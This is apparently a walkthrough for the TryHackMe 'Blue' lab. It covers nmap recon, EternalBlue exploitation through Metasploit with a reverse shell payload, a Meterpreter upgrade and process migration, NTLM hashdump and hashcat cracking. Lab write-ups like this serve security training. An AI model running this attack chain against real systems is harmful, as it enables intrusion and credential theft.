# [Blue](https://tryhackme.com/r/room/blue)

```shell
export MACHINE_IP=x.x.x.x
```

## Task 1 Recon

**How many ports are open with a port number under 1000?**

```shell
nmap -p 1-999 $MACHINE_IP --open
```

**What is this machine vulnerable to? (Hint: exploits an issue within SMBv1)**

```shell
nmap --script smb-vuln* $MACHINE_IP
```

## Task 2 Gain Access

**Find the exploitation code we will run against the machine. What is the full path of the code?**

```shell
msfconsole
search ms17-010
```

**Show options and set the one required value. What is the name of this value?**

```shell
use exploit/windows/smb/ms17_010_eternalblue
show options
```

**With that done, run the exploit!**

```shell
set RHOSTS MACHINE_IP
set payload windows/x64/shell/reverse_tcp
exploit
```

## Task 3 Escalate

**Research online how to convert a shell to meterpreter shell in metasploit**
**What is the name of the post module we will use?**

[Upgrading shells to Meterpreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

```shell
search shell_to_meterpreter
```

**Show options, what option are we required to change?**

```shell
use post/multi/manage/shell_to_meterpreter
show options
```

**Set the required option, you may need to list all of the sessions to find your target here**

```shell
sessions
set SESSION 1 
```

**Run!**

```shell
run
```

**Once the meterpreter shell conversion completes, select that session for use**

```shell
sessions
sessions 2
```

**Verify that we have escalated to NT AUTHORITY\SYSTEM**

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id**

```shell
ps
```

**Migrate to this process**

Migrate `taskhost.exe`:  amazon-ssm-agent.exe

```shell
meterpreter > migrate 2960 
[*] Migrating from 2088 to 2960...
[*] Migration completed successfully.
```

## Task 4 Cracking

**Within our elevated meterpreter shell, run the command 'hashdump'**

```shell
meterpreter > hashdump

Administrator:500:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:hhhhhhhhaaaaaaaasssssssshhhhhhhh:::
Guest:501:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:hhhhhhhhaaaaaaaasssssssshhhhhhhh:::
Jon:1000:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:hhhhhhhhaaaaaaaasssssssshhhhhhhh:::
```

**Copy this password hash to a file and research how to crack it. What is the cracked password?**

* Alternative 1: use https://crackstation.net/ and submit the hash 
* Alternative 2: use [hashcat](https://www.kali.org/tools/hashcat/):
  ```shell
  echo "hhhhhhhhaaaaaaaasssssssshhhhhhhh" > hash.txt
  hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
  ```

## Task 5 Find flags!

**Flag1? Flag2? Flag3?**

```shell
meterpreter > search -f flag*

meterpreter > cat /flag1.txt
meterpreter > cat /Windows/System32/config/flag2.txt
meterpreter > cat /Users/Jon/Documents/flag3.txt
```
